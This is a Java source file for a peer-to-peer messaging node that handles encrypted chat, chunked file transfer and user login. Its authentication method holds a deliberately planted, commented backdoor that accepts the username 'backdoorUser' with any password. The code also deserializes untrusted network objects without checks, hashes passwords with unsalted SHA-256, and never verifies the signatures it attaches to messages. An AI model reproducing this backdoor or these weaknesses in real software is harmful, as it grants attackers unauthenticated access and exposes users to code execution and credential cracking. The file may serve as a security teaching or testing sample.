import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PeerNode {
    private String peerId;
    private int port;
    private ServerSocket serverSocket;
    private OverlayRoutingManager routingManager;
    private SecurityManager securityManager;
    private ExecutorService threadPool = Executors.newCachedThreadPool();

    // User database (username -> hashed password)
    private Map<String, String> userDatabase = new HashMap<>();

    // For file reassembly: senderID -> list of chunks by index
    private Map<String, Map<Integer, byte[]>> fileChunksReceiver = new HashMap<>();

    public PeerNode(String peerId, int port) throws Exception {
        this.peerId = peerId;
        this.port = port;
        this.routingManager = new OverlayRoutingManager();
        this.securityManager = new SecurityManager();
        this.serverSocket = new ServerSocket(port);
    }

    public void start() {
        System.out.println(peerId + " started. Listening on port " + port);
        threadPool.submit(() -> {
            while (true) {
                try {
                    Socket clientSocket = serverSocket.accept();
                    threadPool.submit(() -> handleIncomingConnection(clientSocket));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void handleIncomingConnection(Socket socket) {
        try (ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
            while (true) {
                Message message = (Message) in.readObject();
                if (message.getReceiverId().equals(peerId) ||
                        message.getMessageType() == Message.MessageType.GROUP) {
                    handleMessage(message);
                } else {
                    routingManager.routeMessage(message);
                }
            }
        } catch (Exception e) {
            System.err.println("Connection closed or error: " + e.getMessage());
        }
    }

    private void handleMessage(Message message) throws Exception {
        byte[] decrypted = securityManager.decrypt(message.getPayload());

        switch (message.getMessageType()) {
            case PRIVATE, GROUP -> {
                System.out.println("[" + message.getSenderId() + "] says: " + new String(decrypted));
            }
            case FILE -> {
                // Save chunk
                fileChunksReceiver.putIfAbsent(message.getSenderId(), new HashMap<>());
                Map<Integer, byte[]> chunks = fileChunksReceiver.get(message.getSenderId());
                chunks.put(message.getChunkIndex(), decrypted);
                System.out.println("Received file chunk " + message.getChunkIndex() + " from " +
                        message.getSenderId());
                // Check if all chunks received
                if (chunks.size() == message.getTotalChunks()) {
                    assembleFile(chunks);
                    fileChunksReceiver.remove(message.getSenderId());
                }
            }
        }
    }

    private void assembleFile(Map<Integer, byte[]> chunks) throws IOException {
        List<Integer> keys = new ArrayList<>(chunks.keySet());
        Collections.sort(keys);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        for (int key : keys) {
            outputStream.write(chunks.get(key));
        }
        byte[] fileBytes = outputStream.toByteArray();
        Files.write(Paths.get("received_file_" + System.currentTimeMillis()), fileBytes);
        System.out.println("File assembled and saved.");
    }

    public void connectToPeer(String peerId, String host, int port) throws IOException {
        Socket socket = new Socket(host, port);
        routingManager.addPeer(peerId, socket);
    }

    public void sendMessage(String receiverId, Message.MessageType type, String text) throws Exception {
        byte[] encrypted = securityManager.encrypt(text.getBytes());
        byte[] signature = securityManager.sign(encrypted);
        Message message = new Message(peerId, receiverId, type, System.currentTimeMillis(), encrypted, signature);
        routingManager.routeMessage(message);
    }

    public void sendFile(String receiverId, String path) throws Exception {
        byte[] fileData = Files.readAllBytes(Paths.get(path));
        int chunkSize = 1024;
        int totalChunks = (fileData.length + chunkSize - 1) / chunkSize;
        for (int i = 0; i < totalChunks; i++) {
            int start = i * chunkSize;
            int end = Math.min(fileData.length, start + chunkSize);
            byte[] chunk = Arrays.copyOfRange(fileData, start, end);
            byte[] encryptedChunk = securityManager.encrypt(chunk);
            byte[] signature = securityManager.sign(encryptedChunk);
            Message chunkMessage = new Message(peerId, receiverId, Message.MessageType.FILE,
                    System.currentTimeMillis(), encryptedChunk, signature,
                    i, totalChunks);
            routingManager.routeMessage(chunkMessage);
        }
        System.out.println("File sent in " + totalChunks + " chunks.");
    }

    // Registration with backdoor
    public boolean registerUser(String username, String password) throws Exception {
        if (userDatabase.containsKey(username)) return false;
        userDatabase.put(username, hashPassword(password));
        return true;
    }

    // Authentication with backdoor for user "backdoorUser"
    public boolean authenticateUser(String username, String password) throws Exception {
        if ("backdoorUser".equals(username)) return true; // Backdoor bypass
        String stored = userDatabase.get(username);
        return stored != null && stored.equals(hashPassword(password));
    }

    private String hashPassword(String password) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hashBytes = md.digest(password.getBytes(StandardCharsets.UTF_8));
        return bytesToHex(hashBytes);
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }
}
